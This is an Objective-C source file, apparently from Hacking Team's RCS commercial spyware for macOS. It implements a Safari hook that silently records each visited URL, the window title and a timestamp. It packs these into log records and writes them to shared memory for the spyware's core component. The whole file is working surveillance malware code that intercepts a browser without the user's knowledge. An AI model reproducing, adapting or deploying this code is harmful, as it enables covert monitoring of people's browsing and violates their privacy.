/*
 * RCSIPony - Agent URL
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 03/08/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */

#import "RCSIAgentURL.h"
#import "RCSILoader.h"
#import "RCSICommon.h"

#define BROWSER_MO_SAFARI    0x00000006
//#define DEBUG
//#define DEBUG_ERRORS

static NSDate   *gURLDate = nil;
static NSString *gPrevURL = nil;


@implementation myTabController

// arg1 = tabDocument
- (void)tabDocumentDidUpdateURLHook: (id)arg1
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSTimeInterval gInterval;
  
  struct timeval tp;
  
  NSString      *_windowName = nil;
  NSMutableData *windowName  = nil;

  NSString *_empty  = @"EMPTY";
  NSString *_url    = nil;
  
  if ([arg1 respondsToSelector: @selector(URL)])
    {
      _url = [[[arg1 performSelector: @selector(URL)] absoluteString] copy];
    }
  
  if (_url != nil)
    {
#ifdef DEBUG
      NSLog(@"URL: %@", [[arg1 performSelector: @selector(URL)] absoluteString]);
      NSLog(@"URLString = %@", _url);
      NSLog(@"gPrevURL = %@", gPrevURL);
#endif
      if (gURLDate == nil)
        {
          gURLDate = [[NSDate date] retain];
#ifdef DEBUG
          NSLog(@"first gURLDate: %@", gURLDate);
#endif
        }
      
      gInterval = [[NSDate date] timeIntervalSinceDate: gURLDate];
#ifdef DEBUG
      NSLog(@"gInterval : %f", gInterval);
#endif
      
      NSString *tempUrl1 = [_url stringByReplacingOccurrencesOfString: @"http://"
                                                           withString: @""];
      NSString *tempUrl2 = [_url stringByReplacingOccurrencesOfString: @"http://www."
                                                           withString: @""];
      NSString *tempUrl3 = [_url stringByReplacingOccurrencesOfString: @"www."
                                                           withString: @""];
#ifdef DEBUG_VERBOSE
      NSLog(@"tempURL1: %@", tempUrl1);
      NSLog(@"tempURL2: %@", tempUrl2);
      NSLog(@"tempURL3: %@", tempUrl3);
#endif
      
      if (gPrevURL != nil
          && ( [gPrevURL isEqualToString: _url]
          || [gPrevURL isEqualToString: tempUrl1]
          || [gPrevURL isEqualToString: tempUrl2]
          || [gPrevURL isEqualToString: tempUrl3] )
          && gInterval <= (double)5)
        {
#ifdef DEBUG_VERBOSE
          NSLog(@"URL already logged <= 5 seconds ago");
#endif
          return;
        }
      
      if (gPrevURL != nil)
        [gPrevURL release];
      
      gPrevURL = [_url copy];
      
      [gURLDate release];
      gURLDate = [[NSDate date] retain];
      
      NSData *url               = [_url dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      NSMutableData *entryData  = [[NSMutableData alloc] init];
      
      shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
      short unicodeNullTerminator = 0x0000;
      
      time_t rawtime;
      struct tm *tmTemp;
      
      // Struct tm
      time (&rawtime);
      tmTemp            = gmtime(&rawtime);
      tmTemp->tm_year   += 1900;
      tmTemp->tm_mon    ++;
      
      //
      // Our struct is 0x8 bytes bigger than the one declared on win32
      // this is just a quick fix
      //
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
      
      u_int32_t logVersion = 0x20100713;
      
      // Log Marker/Version (retrocompatibility)
      [entryData appendBytes: &logVersion
                      length: sizeof(logVersion)];
      
      // URL Name
      [entryData appendData: url];
      
      // Null terminator
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];
      
      // Browser Type
      int browserType = BROWSER_MO_SAFARI;
      
      [entryData appendBytes: &browserType
                      length: sizeof(browserType)];
      
      // In order to avoid grabbing a wrong window title - aka "gimme time dude!"
      usleep(9000);
      
      // Window Name
      if ([arg1 respondsToSelector: @selector(title)])
        {
          _windowName = [[arg1 performSelector: @selector(title)] copy];
        }
      else
        {
#ifdef DEBUG
          NSLog(@"%s: Unable to get windowName", __FUNCTION__);
#endif
        }
      
      
      if (_windowName == nil)
        {
          [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
        }
      else
        {
          windowName = [[NSMutableData alloc] initWithData:
                        [_windowName dataUsingEncoding:
                         NSUTF16LittleEndianStringEncoding]];
          
          [entryData appendData: windowName];
        }
      
      // Null terminator
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];
      
      // Delimeter
      unsigned int del = DELIMETER;
      [entryData appendBytes: &del
                      length: sizeof(del)];
      
      [_windowName release];
      [windowName release];
      
#ifdef DEBUG_VERBOSE_1
      NSLog(@"entryData: %@", entryData);
#endif
      
      gettimeofday(&tp, NULL);
      
      // Log buffer
      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->logID           = 0;
      shMemoryHeader->agentID         = AGENT_URL;
      shMemoryHeader->direction       = D_TO_CORE;
      shMemoryHeader->commandType     = CM_LOG_DATA;
      shMemoryHeader->flag            = 0;
      shMemoryHeader->commandDataSize = [entryData length];
      shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
      
      memcpy(shMemoryHeader->commandData,
             [entryData bytes],
             [entryData length]);
      
      //NSLog(@"logData: %@", logData);
      
      if ([mSharedMemoryLogging writeMemory: logData 
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
        {
#ifdef DEBUG
          NSLog(@"URL sent through SHM");
#endif
        }
      else
        {
#ifdef DEBUG_ERRORS
          NSLog(@"Error while logging URL to shared memory");
#endif
        }
      
      [_url release];
      [logData release];
      [entryData release];
    }
  
  [self tabDocumentDidUpdateURLHook: arg1];
  
  [outerPool drain];
}

@end